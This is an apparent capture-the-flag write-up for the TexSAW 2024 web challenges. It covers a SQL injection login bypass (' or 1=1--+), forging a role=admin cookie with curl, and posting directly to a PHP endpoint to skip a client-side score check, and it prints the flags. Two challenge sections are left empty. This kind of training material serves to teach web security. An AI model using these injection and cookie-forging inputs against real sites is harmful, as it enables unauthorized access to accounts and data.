### TexSAW 2024

### Challenges
- Web
  - Login Attempt
  - Crazy Cookie
  - Extreme Security
  - Over 9000
  - Ask, and it shall be given to you

### Challenge 1: Login Attempt

![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/b56385c4-6a19-48c3-9141-f62b089907d0)

- The challenge is a basic sql injection challenge which requires bypassing a login page.I bypassed the login page with a true sql statement `' or 1=1--+`.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/881b97ae-b2a5-44c1-8cf8-3a073fa2fba9)

- Flag

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/582ef905-850d-421f-afa6-30e09a32c793)

### Challenge 2: Crazy Cookie

![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/61d8f77f-ea45-4d9f-8bad-e5aae4d212d2)

- The challenge's objective is to bypass this login page.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/35f367af-e620-4897-8fb7-f0d3a025986a)

- After analyzing the response of the response with curl, I noticed that the cookie contains a key 'role' with the value 'user'.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3970f7f8-e7d5-4462-a10e-7e7e81bc9892)

- I got the flag by setting the `role` value to admin

          ❯ curl http://3.23.56.243:9002/ -H 'Cookie: role=admin; Path=/'
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Flag</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    text-align: center;
                    margin: 0;
                    padding: 0;
                    background-color: #f3f3f3;
                }
                .container {
                    max-width: 600px;
                    margin: 50px auto;
                    background-color: #fff;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    padding: 20px;
                }
                h1 {
                    color: #4CAF50;
                    margin-top: 0;
                }
                .flag {
                    font-size: 24px;
                    color: #FF5722; /* Orange color */
                    margin-top: 20px;
                    padding: 10px;
                    border: 2px solid #FF5722; /* Orange border */
                    border-radius: 5px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Flag!</h1>
                <div class="flag">
                    texsaw{cR@zy_c00Ki3}
                </div>
            </div>
        </body>
        </html>           
        

### Challenge 3: Extreme Security

![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/1deae3cb-e7b9-4295-b4dc-4e95ff32f7c4)

- In this challenge, the site will only allow requests from this origin `https://texsaw2024.com` will be allowed which means  Cross Origin Resource Sharing configuration pf the site is set to the url above.A request made by a url `http://texsaw2024.com` will be restricted because of the `http://` protocol in the url

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/4c908f0f-bacd-4db5-a456-95dc6e03c502)

- 






### Challenge 4: Over 9000

![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/92c0a2fd-a501-41c9-9336-c9bb5e303a47)

- In this challenge, players will only be granted the flag if they score an energy of over 9000 energy.

  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d04caa09-d7eb-42a8-a286-b235e558884d)

- The challenge contains a javascript code located in a file `9000.js`

  
      let currentEnergy = 0;
      
      function gatheringEnergy(){
          currentEnergy++;
          $("#energycount").html(`${currentEnergy}`);
          if(currentEnergy == 10)
          {
              alert("out of energy try again :(")
              currentEnergy = 0;
              $("#energycount").html(0);
              
          }
          else if (currentEnergy > 9000)
          {
              
              $.ajax({
                  type:"POST",
                  url:"kamehameha.php",
                  data:{energy: currentEnergy},
                  success: function(flag){
                      alert(`${flag}`);
                  },
                  error: function(responseText,status, error){
                      console.log(`Tell the infrastructure team to fix this: Status = ${status} ; Error = ${error}`);
                  }
      
      
              })
              
          }
      }
 - The code snippet states that if the `currentEnergy` variable is greater than 9000, a POST request with data stating the amount of current energy is made to another page `kamehameha.php` which grants us the flag. Instead of playing the game, we can just make a request to the `kamehameha.php` page with current energy of 9000 to get the flag.

          ❯ curl http://3.23.56.243:9005/kamehameha.php -d "energy=90000" -X POST
        texsaw{y0u_th0ught_th1s_w4s_4_fl4g_but_1t_w4s_m3_d10}

Challenge 5: Ask and it shall be given unto you
   

   
